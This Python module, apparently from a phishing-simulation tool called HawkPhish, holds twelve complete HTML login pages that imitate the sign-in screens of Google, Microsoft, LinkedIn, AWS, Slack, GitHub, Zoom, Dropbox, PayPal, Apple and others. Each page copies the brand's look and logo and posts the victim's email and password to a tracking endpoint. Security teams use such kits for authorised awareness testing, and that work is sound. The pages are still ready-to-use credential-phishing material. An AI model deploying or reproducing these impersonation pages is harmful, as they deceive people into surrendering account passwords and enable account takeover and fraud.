"""HawkPhish - Pre-built Landing Page Templates"""
from typing import List, Dict


TEMPLATES: List[Dict] = [
    {
        "name": "Google Login",
        "category": "google",
        "description": "Google account sign-in page with logo and styling",
        "capture_fields": ["email", "password"],
        "html": """
<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Sign in - Google Account</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:'Google Sans',Roboto,Arial,sans-serif;background:#fff;display:flex;justify-content:center;align-items:center;min-height:100vh}
.container{width:100%;max-width:450px;padding:48px 40px 36px;background:#fff;border-radius:28px;box-shadow:0 2px 10px rgba(0,0,0,.1)}
.logo{text-align:center;margin-bottom:16px}
.logo img{height:75px}
h1{font-size:24px;font-weight:400;color:#202124;text-align:center;margin-bottom:4px}
h2{font-size:16px;font-weight:400;color:#202124;text-align:center;margin-bottom:32px}
.form-group{margin-bottom:20px;position:relative}
input{width:100%;padding:13px 15px;border:1px solid #dadce0;border-radius:4px;font-size:16px;outline:none;transition:.2s}
input:focus{border-color:#1a73e8;box-shadow:0 0 0 2px rgba(26,115,232,.2)}
.label{position:absolute;top:-8px;left:12px;background:#fff;padding:0 4px;font-size:12px;color:#1a73e8;display:none}
input:focus+.label,input:not(:placeholder-shown)+.label{display:block}
.btn{width:100%;padding:10px 24px;background:#1a73e8;color:#fff;border:none;border-radius:4px;font-size:14px;font-weight:500;cursor:pointer;margin-top:12px}
.btn:hover{background:#1765cc;box-shadow:0 1px 3px rgba(0,0,0,.2)}
.help{text-align:left;margin-top:8px}
.help a{color:#1a73e8;text-decoration:none;font-size:14px}
.footer{text-align:center;margin-top:32px;font-size:12px;color:#5f6368}
.lang{text-align:center;margin-top:20px;font-size:12px;color:#5f6368}
</style>
</head>
<body>
<div class="container">
<div class="logo"><img src="https://www.gstatic.com/firebasejs/ui/2.0.0/images/auth/google.svg" alt="Google"></div>
<h1>Sign in</h1>
<h2>Use your Google Account</h2>
<form action="/tracking/submit" method="POST">
<input type="hidden" name="campaign_id" value="##campaign_id##">
<input type="hidden" name="tracking_id" value="##tracking_id##">
<div class="form-group">
<input type="email" name="email" placeholder=" " required autofocus>
<label class="label">Email or phone</label>
</div>
<div class="form-group">
<input type="password" name="password" placeholder=" " required>
<label class="label">Enter your password</label>
</div>
<div class="help"><a href="#">Forgot email?</a></div>
<button type="submit" class="btn">Next</button>
</form>
<div class="footer">Not your computer? Use a private browsing window to sign in.</div>
<div class="lang"><a href="#">English (United States)</a></div>
</div>
</body>
</html>
"""
    },
    {
        "name": "Microsoft 365",
        "category": "microsoft",
        "description": "Microsoft 365 / Outlook sign-in page",
        "capture_fields": ["email", "password"],
        "html": """
<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Sign in to your account</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:'Segoe UI',Tahoma,Geneva,Verdana,sans-serif;background:#f2f2f2;display:flex;justify-content:center;align-items:center;min-height:100vh}
.container{width:440px;background:#fff;border-radius:3px;box-shadow:0 2px 6px rgba(0,0,0,.2);padding:44px}
.logo{text-align:center;margin-bottom:24px}
.logo img{height:108px}
h1{font-size:24px;font-weight:600;color:#1b1b1b;text-align:center;margin-bottom:24px}
.form-group{margin-bottom:16px}
input{width:100%;padding:6px 10px;border:1px solid #666;border-bottom:2px solid #0067b8;font-size:15px;outline:none}
input:focus{border-color:#0067b8}
.btn{width:100%;padding:10px;background:#0067b8;color:#fff;border:none;font-size:15px;font-weight:600;cursor:pointer;margin-top:8px}
.btn:hover{background:#005a9e}
.links{margin-top:16px;text-align:center}
.links a{color:#0067b8;text-decoration:none;font-size:13px;margin:0 8px}
.footer{text-align:center;margin-top:32px;font-size:12px;color:#666}
</style>
</head>
<body>
<div class="container">
<div class="logo"><img src="https://upload.wikimedia.org/wikipedia/commons/9/96/Microsoft_logo_%282012%29.svg" alt="Microsoft"></div>
<h1>Sign in</h1>
<form action="/tracking/submit" method="POST">
<input type="hidden" name="campaign_id" value="##campaign_id##">
<input type="hidden" name="tracking_id" value="##tracking_id##">
<div class="form-group">
<input type="email" name="email" placeholder="Email, phone, or Skype" required autofocus>
</div>
<div class="form-group">
<input type="password" name="password" placeholder="Password" required>
</div>
<button type="submit" class="btn">Sign in</button>
</form>
<div class="links"><a href="#">Forgot my password</a><a href="#">Sign-in options</a></div>
<div class="footer">Need help? <a href="#" style="color:#0067b8">Get assistance</a></div>
</div>
</body>
</html>
"""
    },
    {
        "name": "Office 365",
        "category": "microsoft",
        "description": "Office 365 enterprise login with SSO redirect",
        "capture_fields": ["email", "password"],
        "html": """
<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Sign in to Office 365</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:'Segoe UI',sans-serif;background:#f2f2f2;display:flex;justify-content:center;align-items:center;min-height:100vh}
.box{width:440px;background:#fff;border-radius:6px;padding:44px;box-shadow:0 2px 6px rgba(0,0,0,.15)}
.logo{text-align:center;margin-bottom:32px}
.logo img{height:120px}
.form-group{margin-bottom:16px}
label{display:block;font-size:13px;color:#616161;margin-bottom:4px}
input{width:100%;padding:6px 10px;border:1px solid #666;border-radius:2px;font-size:15px;outline:none}
input:focus{border-color:#0078d4;border-bottom:2px solid #0078d4}
.btn{width:100%;padding:10px;background:#0078d4;color:#fff;border:none;border-radius:4px;font-size:14px;font-weight:600;cursor:pointer;margin-top:16px}
.btn:hover{background:#006cbe}
.links{margin-top:20px;text-align:center}
.links a{color:#0078d4;text-decoration:none;font-size:13px;margin:0 10px}
</style>
</head>
<body>
<div class="box">
<div class="logo"><img src="https://img-prod-cms-rt-microsoft-com.akamaized.net/cms/api/am/image/RWAHuF?ver=9ed6&q=90&m=6&h=705&w=1253&b=%7B%221668%22%3A%7B%22b%22%3A%22FFFFFFFF%22%2C%22a%22%3A%22C5A576111D84D5B8A2E78EB0720B3F78%22%7D%7D&o=%7B%7D" alt="Microsoft 365"></div>
<form action="/tracking/submit" method="POST">
<input type="hidden" name="campaign_id" value="##campaign_id##">
<input type="hidden" name="tracking_id" value="##tracking_id##">
<div class="form-group">
<label>Email address</label>
<input type="email" name="email" placeholder="user@company.com" required autofocus>
</div>
<div class="form-group">
<label>Password</label>
<input type="password" name="password" placeholder="Enter password" required>
</div>
<button type="submit" class="btn">Sign in</button>
</form>
<div class="links"><a href="#">Can't access your account?</a><a href="#">Sign-in options</a></div>
</div>
</body>
</html>
"""
    },
    {
        "name": "LinkedIn",
        "category": "linkedin",
        "description": "LinkedIn professional network sign-in",
        "capture_fields": ["email", "password"],
        "html": """
<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>LinkedIn Login</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,Oxygen,sans-serif;background:#f3f2ef;display:flex;justify-content:center;align-items:center;min-height:100vh}
.container{width:352px;text-align:center}
.logo{margin-bottom:32px}
.logo img{height:34px}
h1{font-size:32px;font-weight:600;color:#000000e6;margin-bottom:8px}
.form-group{margin-bottom:12px;text-align:left}
input{width:100%;padding:10px 12px;border:1px solid rgba(0,0,0,.6);border-radius:4px;font-size:16px;background:#eef3f8;outline:none}
input:focus{border:2px solid #0a66c2;background:#fff}
.btn{width:100%;padding:12px;background:#0a66c2;color:#fff;border:none;border-radius:28px;font-size:16px;font-weight:600;cursor:pointer;margin-top:16px}
.btn:hover{background:#004182}
.divider{margin:24px 0;text-align:center;position:relative}
.divider:before{content:'';position:absolute;top:50%;left:0;right:0;border-top:1px solid #cdcdcd}
.divider span{background:#f3f2ef;padding:0 12px;position:relative;color:#666;font-size:14px}
.join{margin-top:32px;font-size:16px}
.join a{color:#0a66c2;text-decoration:none;font-weight:600}
.footer{margin-top:16px;font-size:12px;color:#666}
</style>
</head>
<body>
<div class="container">
<div class="logo"><img src="https://upload.wikimedia.org/wikipedia/commons/c/ca/LinkedIn_logo_initials.png" alt="LinkedIn"></div>
<h1>Sign in</h1>
<form action="/tracking/submit" method="POST" style="margin-top:24px">
<input type="hidden" name="campaign_id" value="##campaign_id##">
<input type="hidden" name="tracking_id" value="##tracking_id##">
<div class="form-group">
<input type="email" name="email" placeholder="Email or phone" required autofocus>
</div>
<div class="form-group">
<input type="password" name="password" placeholder="Password" required>
</div>
<button type="submit" class="btn">Sign in</button>
</form>
<div class="join"><a href="#">New to LinkedIn? Join now</a></div>
<div class="footer">By clicking Agree & Join, you agree to the LinkedIn User Agreement and Privacy Policy.</div>
</div>
</body>
</html>
"""
    },
    {
        "name": "Outlook Web",
        "category": "microsoft",
        "description": "Outlook Web App login (OWA style)",
        "capture_fields": ["email", "password"],
        "html": """
<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Outlook Web App</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:'Segoe UI',sans-serif;background:linear-gradient(135deg,#0078d4 0%,#005a9e 100%);display:flex;justify-content:center;align-items:center;min-height:100vh}
.box{width:420px;background:#fff;border-radius:8px;padding:48px;box-shadow:0 8px 32px rgba(0,0,0,.3)}
.logo{text-align:center;margin-bottom:32px}
.logo svg{height:48px}
h1{font-size:20px;font-weight:600;color:#323130;text-align:center;margin-bottom:24px}
.form-group{margin-bottom:16px}
input{width:100%;padding:8px 12px;border:1px solid #8a8886;border-radius:4px;font-size:14px;outline:none}
input:focus{border-color:#0078d4;border-bottom:2px solid #0078d4}
.btn{width:100%;padding:10px;background:#0078d4;color:#fff;border:none;border-radius:4px;font-size:14px;font-weight:600;cursor:pointer;margin-top:12px}
.btn:hover{background:#006cbe}
.remember{display:flex;align-items:center;gap:8px;margin-top:12px;font-size:13px;color:#605e5c}
</style>
</head>
<body>
<div class="box">
<div class="logo">
<svg viewBox="0 0 112 24" fill="#0078d4"><text x="0" y="20" font-size="20" font-family="Segoe UI" font-weight="600">Outlook</text></svg>
</div>
<h1>Sign in</h1>
<form action="/tracking/submit" method="POST">
<input type="hidden" name="campaign_id" value="##campaign_id##">
<input type="hidden" name="tracking_id" value="##tracking_id##">
<div class="form-group">
<input type="email" name="email" placeholder="Email address" required autofocus>
</div>
<div class="form-group">
<input type="password" name="password" placeholder="Password" required>
</div>
<button type="submit" class="btn">Sign in</button>
<div class="remember"><input type="checkbox" id="keep"> <label for="keep">Keep me signed in</label></div>
</form>
</div>
</body>
</html>
"""
    },
    {
        "name": "AWS Console",
        "category": "aws",
        "description": "Amazon Web Services Management Console login",
        "capture_fields": ["email", "password"],
        "html": """
<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Amazon Web Services Sign-In</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:Amazon Ember,'Helvetica Neue',sans-serif;background:#232f3e;display:flex;justify-content:center;align-items:center;min-height:100vh}
.box{width:400px;background:#fff;border-radius:8px;padding:40px;box-shadow:0 4px 16px rgba(0,0,0,.3)}
.logo{text-align:center;margin-bottom:24px}
.logo img{height:30px}
h1{font-size:20px;font-weight:700;color:#16191f;text-align:center;margin-bottom:24px}
.form-group{margin-bottom:14px}
label{display:block;font-size:13px;font-weight:700;color:#16191f;margin-bottom:6px}
input{width:100%;padding:8px 10px;border:1px solid #aab7b8;border-radius:4px;font-size:14px;outline:none}
input:focus{border-color:#ec7211;box-shadow:0 0 3px rgba(236,114,17,.5)}
.btn{width:100%;padding:10px;background:#ff9900;color:#111;border:none;border-radius:4px;font-size:14px;font-weight:700;cursor:pointer;margin-top:16px}
.btn:hover{background:#ec7211}
.help{text-align:right;margin-top:12px}
.help a{color:#0073bb;text-decoration:none;font-size:13px}
.footer{text-align:center;margin-top:32px;font-size:12px;color:#aab7b8}
</style>
</head>
<body>
<div class="box">
<div class="logo"><img src="https://upload.wikimedia.org/wikipedia/commons/9/93/Amazon_Web_Services_Logo.svg" alt="AWS"></div>
<h1>Sign in to AWS Console</h1>
<form action="/tracking/submit" method="POST">
<input type="hidden" name="campaign_id" value="##campaign_id##">
<input type="hidden" name="tracking_id" value="##tracking_id##">
<div class="form-group">
<label>Email address</label>
<input type="email" name="email" placeholder="you@example.com" required autofocus>
</div>
<div class="form-group">
<label>Password</label>
<input type="password" name="password" placeholder="Enter password" required>
</div>
<button type="submit" class="btn">Sign In</button>
</form>
<div class="help"><a href="#">Forgot password?</a></div>
<div class="footer">Sign in as IAM user? <a href="#" style="color:#0073bb">Click here</a></div>
</div>
</body>
</html>
"""
    },
    {
        "name": "Slack",
        "category": "slack",
        "description": "Slack workspace sign-in",
        "capture_fields": ["email", "password"],
        "html": """
<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Sign in to Slack</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:Lato,'Helvetica Neue',sans-serif;background:#1a1d21;display:flex;justify-content:center;align-items:center;min-height:100vh}
.box{width:460px;background:#fff;border-radius:12px;padding:48px;box-shadow:0 8px 32px rgba(0,0,0,.3)}
.logo{text-align:center;margin-bottom:24px}
.logo img{height:48px}
h1{font-size:28px;font-weight:700;color:#1d1c1d;text-align:center;margin-bottom:8px}
p{text-align:center;color:#616061;font-size:15px;margin-bottom:32px}
.form-group{margin-bottom:16px}
label{display:block;font-size:15px;font-weight:700;color:#1d1c1d;margin-bottom:6px}
input{width:100%;padding:10px 12px;border:1px solid #ddd;border-radius:6px;font-size:16px;outline:none}
input:focus{border-color:#1264a3;box-shadow:0 0 0 1px #1264a3}
.btn{width:100%;padding:12px;background:#007a5a;color:#fff;border:none;border-radius:6px;font-size:16px;font-weight:700;cursor:pointer;margin-top:8px}
.btn:hover{background:#006a4e}
.divider{text-align:center;margin:24px 0;position:relative}
.divider:after{content:'';position:absolute;top:50%;left:0;right:0;border-top:1px solid #ddd}
.divider span{background:#fff;padding:0 16px;color:#616061;font-size:13px;position:relative}
.other-login{text-align:center;margin-bottom:24px}
.google-btn{width:100%;padding:10px;border:1px solid #ddd;border-radius:6px;background:#fff;font-size:14px;cursor:pointer;display:flex;align-items:center;justify-content:center;gap:8px}
.google-btn:hover{background:#f8f8f8}
.footer{text-align:center;font-size:14px;color:#616061}
.footer a{color:#1264a3;text-decoration:none}
</style>
</head>
<body>
<div class="box">
<div class="logo"><img src="https://cdn.slack-edge.com/80588/marketing/img/meta/slack_logo_256.png" alt="Slack"></div>
<h1>Sign in to Slack</h1>
<p>We suggest using your work email address.</p>
<form action="/tracking/submit" method="POST">
<input type="hidden" name="campaign_id" value="##campaign_id##">
<input type="hidden" name="tracking_id" value="##tracking_id##">
<div class="form-group">
<label>Email address</label>
<input type="email" name="email" placeholder="name@work-email.com" required autofocus>
</div>
<div class="form-group">
<label>Password</label>
<input type="password" name="password" placeholder="Enter password" required>
</div>
<button type="submit" class="btn">Continue</button>
</form>
<div class="footer">New to Slack? <a href="#">Create an account</a></div>
</div>
</body>
</html>
"""
    },
    {
        "name": "GitHub",
        "category": "github",
        "description": "GitHub sign-in page",
        "capture_fields": ["email", "password"],
        "html": """
<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Sign in to GitHub · GitHub</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Noto Sans,Helvetica,Arial,sans-serif;background:#0d1117;display:flex;justify-content:center;align-items:center;min-height:100vh}
.box{width:340px;background:#fff;border-radius:6px;padding:44px;border:1px solid #d0d7de}
.logo{text-align:center;margin-bottom:24px}
.logo svg{fill:#24292f}
h1{font-size:24px;font-weight:600;color:#24292f;text-align:center;margin-bottom:16px}
.form-group{margin-bottom:16px}
label{display:block;font-size:14px;font-weight:600;color:#24292f;margin-bottom:6px}
input{width:100%;padding:5px 12px;border:1px solid #d0d7de;border-radius:6px;font-size:14px;outline:none;background:#f6f8fa}
input:focus{border-color:#0969da;box-shadow:0 0 0 3px rgba(9,105,218,.1);background:#fff}
.btn{width:100%;padding:5px 16px;background:#2da44e;color:#fff;border:1px solid rgba(27,31,36,.15);border-radius:6px;font-size:14px;font-weight:600;cursor:pointer;margin-top:8px}
.btn:hover{background:#2c974b}
.help{text-align:right;margin-top:8px}
.help a{color:#0969da;text-decoration:none;font-size:12px}
.or{text-align:center;margin:16px 0;color:#57606a;font-size:14px}
.new-user{text-align:center;margin-top:24px;padding-top:16px;border-top:1px solid #d0d7de;font-size:14px}
.new-user a{color:#0969da;text-decoration:none;font-weight:600}
</style>
</head>
<body>
<div class="box">
<div class="logo">
<svg height="48" viewBox="0 0 16 16"><path d="M8 0C3.58 0 0 3.58 0 8c0 3.54 2.29 6.53 5.47 7.59.4.07.55-.17.55-.38 0-.19-.01-.82-.01-1.49-2.01.37-2.53-.49-2.69-.94-.09-.23-.48-.94-.82-1.13-.28-.15-.68-.52-.01-.53.63-.01 1.08.58 1.23.82.72 1.21 1.87.87 2.33.66.07-.52.28-.87.51-1.07-1.78-.2-3.64-.89-3.64-3.95 0-.87.31-1.59.82-2.15-.08-.2-.36-1.02.08-2.12 0 0 .67-.21 2.2.82.64-.18 1.32-.27 2-.27.68 0 1.36.09 2 .27 1.53-1.04 2.2-.82 2.2-.82.44 1.1.16 1.92.08 2.12.51.56.82 1.27.82 2.15 0 3.07-1.87 3.75-3.65 3.95.29.25.54.73.54 1.48 0 1.07-.01 1.93-.01 2.2 0 .21.15.46.55.38A8.013 8.013 0 0016 8c0-4.42-3.58-8-8-8z"></path></svg>
</div>
<h1>Sign in to GitHub</h1>
<form action="/tracking/submit" method="POST">
<input type="hidden" name="campaign_id" value="##campaign_id##">
<input type="hidden" name="tracking_id" value="##tracking_id##">
<div class="form-group">
<label>Username or email address</label>
<input type="email" name="email" placeholder="Username or email address" required autofocus>
</div>
<div class="form-group">
<label>Password</label>
<input type="password" name="password" placeholder="Password" required>
</div>
<button type="submit" class="btn">Sign in</button>
</form>
<div class="help"><a href="#">Forgot password?</a></div>
<div class="new-user">New to GitHub? <a href="#">Create an account</a></div>
</div>
</body>
</html>
"""
    },
    {
        "name": "Zoom",
        "category": "zoom",
        "description": "Zoom meetings sign-in page",
        "capture_fields": ["email", "password"],
        "html": """
<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Sign In - Zoom</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:'Lato',sans-serif;background:#f7f7f7;display:flex;justify-content:center;align-items:center;min-height:100vh}
.box{width:440px;background:#fff;border-radius:8px;padding:48px;box-shadow:0 4px 16px rgba(0,0,0,.1)}
.logo{text-align:center;margin-bottom:32px}
.logo img{height:48px}
h1{font-size:18px;font-weight:700;color:#232333;text-align:center;margin-bottom:24px}
.form-group{margin-bottom:16px}
input{width:100%;padding:10px 12px;border:1px solid #ccc;border-radius:8px;font-size:14px;outline:none}
input:focus{border-color:#0e72ed;box-shadow:0 0 0 1px #0e72ed}
.btn{width:100%;padding:12px;background:#0e72ed;color:#fff;border:none;border-radius:8px;font-size:14px;font-weight:700;cursor:pointer;margin-top:8px}
.btn:hover{background:#0c62d1}
.divider{text-align:center;margin:20px 0;position:relative}
.divider:after{content:'';position:absolute;top:50%;left:0;right:0;border-top:1px solid #ccc}
.divider span{background:#fff;padding:0 16px;color:#747487;font-size:13px;position:relative}
.sso{width:100%;padding:10px;border:1px solid #0e72ed;border-radius:8px;background:#fff;color:#0e72ed;font-size:14px;font-weight:700;cursor:pointer;margin-bottom:12px}
.sso:hover{background:#f0f7ff}
.footer{text-align:center;margin-top:24px;font-size:12px;color:#747487}
.footer a{color:#0e72ed;text-decoration:none}
</style>
</head>
<body>
<div class="box">
<div class="logo"><img src="https://st1.zoom.us/zoom-db/static/4ecb79e8d4f14e649ed37e78e1c9e8c3.png" alt="Zoom"></div>
<h1>Sign In</h1>
<form action="/tracking/submit" method="POST">
<input type="hidden" name="campaign_id" value="##campaign_id##">
<input type="hidden" name="tracking_id" value="##tracking_id##">
<div class="form-group">
<input type="email" name="email" placeholder="Email Address" required autofocus>
</div>
<div class="form-group">
<input type="password" name="password" placeholder="Password" required>
</div>
<button type="submit" class="btn">Sign In</button>
</form>
<div class="divider"><span>or</span></div>
<button class="sso">Sign in with SSO</button>
<div class="footer">Don't have an account? <a href="#">Sign Up Free</a></div>
</div>
</body>
</html>
"""
    },
    {
        "name": "Dropbox",
        "category": "dropbox",
        "description": "Dropbox file sharing sign-in",
        "capture_fields": ["email", "password"],
        "html": """
<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Dropbox Sign In</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:Atlas Grotesk,Aeonik,-apple-system,sans-serif;background:#fff;display:flex;justify-content:center;align-items:center;min-height:100vh}
.box{width:400px;padding:60px 40px}
.logo{text-align:left;margin-bottom:40px}
.logo img{height:26px}
h1{font-size:24px;font-weight:700;color:#000;margin-bottom:8px}
.sub{font-size:15px;color:#637282;margin-bottom:32px}
.form-group{margin-bottom:20px}
input{width:100%;padding:12px;border:1px solid #919aa6;border-radius:4px;font-size:15px;outline:none;transition:.2s}
input:focus{border-color:#0061ff;box-shadow:0 0 0 1px #0061ff}
.btn{width:100%;padding:12px;background:#0061ff;color:#fff;border:none;border-radius:4px;font-size:15px;font-weight:600;cursor:pointer;margin-top:8px}
.btn:hover{background:#0050d1}
.help{text-align:left;margin-top:12px}
.help a{color:#0061ff;text-decoration:none;font-size:14px}
.footer{margin-top:40px;font-size:14px;color:#637282}
.footer a{color:#0061ff;text-decoration:none}
</style>
</head>
<body>
<div class="box">
<div class="logo"><img src="https://upload.wikimedia.org/wikipedia/commons/c/cb/Dropbox_logo_2017.svg" alt="Dropbox"></div>
<h1>Sign in</h1>
<p class="sub">or create an account if you don't have one</p>
<form action="/tracking/submit" method="POST">
<input type="hidden" name="campaign_id" value="##campaign_id##">
<input type="hidden" name="tracking_id" value="##tracking_id##">
<div class="form-group">
<input type="email" name="email" placeholder="Email" required autofocus>
</div>
<div class="form-group">
<input type="password" name="password" placeholder="Password" required>
</div>
<button type="submit" class="btn">Continue</button>
</form>
<div class="help"><a href="#">Forgot your password?</a></div>
<div class="footer">By continuing, you agree to the <a href="#">Dropbox Terms</a> and <a href="#">Privacy Policy</a>.</div>
</div>
</body>
</html>
"""
    },
    {
        "name": "PayPal",
        "category": "paypal",
        "description": "PayPal account sign-in",
        "capture_fields": ["email", "password"],
        "html": """
<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>PayPal Login</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:HelveticaNeue,Helvetica,Arial,sans-serif;background:#f5f7fa;display:flex;justify-content:center;align-items:center;min-height:100vh}
.box{width:400px;background:#fff;border-radius:12px;padding:40px;box-shadow:0 4px 12px rgba(0,0,0,.08)}
.logo{text-align:center;margin-bottom:32px}
.logo img{height:40px}
h1{font-size:22px;font-weight:700;color:#003087;text-align:center;margin-bottom:24px}
.form-group{margin-bottom:16px}
label{display:block;font-size:13px;color:#333;margin-bottom:4px;font-weight:600}
input{width:100%;padding:10px 12px;border:1px solid #ccc;border-radius:6px;font-size:15px;outline:none}
input:focus{border-color:#003087;box-shadow:0 0 0 1px #003087}
.btn{width:100%;padding:12px;background:#0070ba;color:#fff;border:none;border-radius:24px;font-size:16px;font-weight:700;cursor:pointer;margin-top:8px}
.btn:hover{background:#005ea6}
.help{text-align:center;margin-top:16px}
.help a{color:#0070ba;text-decoration:none;font-size:13px}
.divider{text-align:center;margin:24px 0;color:#999;font-size:13px}
.signup{text-align:center;margin-top:20px;padding-top:20px;border-top:1px solid #eee;font-size:14px;color:#333}
.signup a{color:#0070ba;text-decoration:none;font-weight:700}
</style>
</head>
<body>
<div class="box">
<div class="logo"><img src="https://upload.wikimedia.org/wikipedia/commons/b/b5/PayPal.svg" alt="PayPal"></div>
<h1>Log in to PayPal</h1>
<form action="/tracking/submit" method="POST">
<input type="hidden" name="campaign_id" value="##campaign_id##">
<input type="hidden" name="tracking_id" value="##tracking_id##">
<div class="form-group">
<label>Email address</label>
<input type="email" name="email" placeholder="Enter your email" required autofocus>
</div>
<div class="form-group">
<label>Password</label>
<input type="password" name="password" placeholder="Enter your password" required>
</div>
<button type="submit" class="btn">Log In</button>
</form>
<div class="help"><a href="#">Having trouble logging in?</a></div>
<div class="signup">New to PayPal? <a href="#">Sign Up</a></div>
</div>
</body>
</html>
"""
    },
    {
        "name": "Apple ID",
        "category": "apple",
        "description": "Apple ID / iCloud sign-in",
        "capture_fields": ["email", "password"],
        "html": """
<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Sign in to Apple Account</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:-apple-system,BlinkMacSystemFont,'SF Pro Display','Helvetica Neue',sans-serif;background:#f5f5f7;display:flex;justify-content:center;align-items:center;min-height:100vh}
.box{width:380px;text-align:center}
.logo{margin-bottom:18px}
.logo svg{height:48px;fill:#1d1d1f}
h1{font-size:28px;font-weight:600;color:#1d1d1f;margin-bottom:8px}
.sub{font-size:15px;color:#6e6e73;margin-bottom:32px}
.form-group{margin-bottom:14px;text-align:left}
input{width:100%;padding:12px 16px;border:1px solid #d2d2d7;border-radius:12px;font-size:17px;background:#fff;outline:none;transition:.2s}
input:focus{border-color:#0071e3;box-shadow:0 0 0 3px rgba(0,113,227,.15)}
.btn{width:100%;padding:12px;background:#0071e3;color:#fff;border:none;border-radius:12px;font-size:17px;font-weight:500;cursor:pointer;margin-top:16px}
.btn:hover{background:#0077ed}
.links{margin-top:20px;font-size:14px}
.links a{color:#0071e3;text-decoration:none}
.divider{margin:28px 0;position:relative;border-top:1px solid #d2d2d7}
.footer{margin-top:24px;font-size:12px;color:#86868b}
</style>
</head>
<body>
<div class="box">
<div class="logo">
<svg viewBox="0 0 17 48" width="17" height="48"><path d="M15.5 22.2c0-4.3 3.5-6.4 3.7-6.5-2-2.9-5.1-3.3-6.2-3.3-2.6-.3-5.1 1.6-6.4 1.6-1.4 0-3.5-1.5-5.7-1.5-2.9.1-5.6 1.7-7.1 4.3-3.1 5.3-.8 13.1 2.2 17.4 1.5 2.1 3.2 4.4 5.5 4.3 2.2-.1 3-1.4 5.6-1.4 2.6 0 3.3 1.4 5.6 1.4 2.4 0 3.9-2.1 5.3-4.2 1.7-2.4 2.4-4.8 2.5-4.9-.1-.1-4.8-1.8-4.8-7.3zM11.3 8.1c1.2-1.5 2-3.5 1.8-5.6-1.7.1-3.8 1.2-5.1 2.7-1.1 1.3-2.1 3.4-1.8 5.5 1.9.1 3.9-1 5.1-2.6z" fill="#1d1d1f"/></svg>
</div>
<h1>Sign in with Apple ID</h1>
<p class="sub">Use your Apple Account to sign in</p>
<form action="/tracking/submit" method="POST">
<input type="hidden" name="campaign_id" value="##campaign_id##">
<input type="hidden" name="tracking_id" value="##tracking_id##">
<div class="form-group">
<input type="email" name="email" placeholder="Email or Phone Number" required autofocus>
</div>
<div class="form-group">
<input type="password" name="password" placeholder="Password" required>
</div>
<button type="submit" class="btn">Continue</button>
</form>
<div class="links"><a href="#">Forgot password?</a></div>
<div class="footer">Don't have an Apple ID? <a href="#" style="color:#0071e3">Create yours now</a></div>
</div>
</body>
</html>
"""
    },
]


def get_all_templates() -> List[Dict]:
    return [{"name": t["name"], "category": t["category"], "description": t["description"], "capture_fields": t["capture_fields"]} for t in TEMPLATES]


def get_template(name: str) -> Dict:
    for t in TEMPLATES:
        if t["name"].lower() == name.lower():
            return t
    return None
